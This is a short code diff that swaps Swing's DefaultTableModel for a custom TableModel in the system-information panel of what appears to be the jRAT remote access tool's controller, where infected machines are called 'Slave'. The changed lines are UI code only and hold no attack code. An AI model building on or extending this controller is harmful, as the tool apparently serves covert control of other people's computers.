@@ -7,10 +7,10 @@ import java.awt.BorderLayout;
 import javax.swing.ImageIcon;
 import javax.swing.JScrollPane;
 import javax.swing.JTable;
-import javax.swing.table.DefaultTableModel;
 
 import se.jrat.common.utils.DataUnits;
 import se.jrat.controller.Slave;
+import se.jrat.controller.ui.components.TableModel;
 import se.jrat.controller.ui.components.DefaultJTable;
 import se.jrat.controller.ui.renderers.table.ComputerInfoTableRenderer;
 import se.jrat.controller.utils.FlagUtils;
@@ -21,7 +21,7 @@ import com.redpois0n.oslib.Icons;
 public class PanelControlSystemInfo extends PanelControlParent {
 
 	private JTable table;
-	private DefaultTableModel model;
+	private TableModel model;
 
 	public PanelControlSystemInfo(Slave sl) {
 		super(sl);
@@ -33,7 +33,7 @@ public class PanelControlSystemInfo extends PanelControlParent {
 		table = new DefaultJTable();
 		table.setDefaultRenderer(Object.class, new ComputerInfoTableRenderer());
 		table.getTableHeader().setReorderingAllowed(false);
-		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Key", "Value" }));
+		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Key", "Value" }));
 		table.setRowHeight(25);
 
 		scrollPane.setViewportView(table);
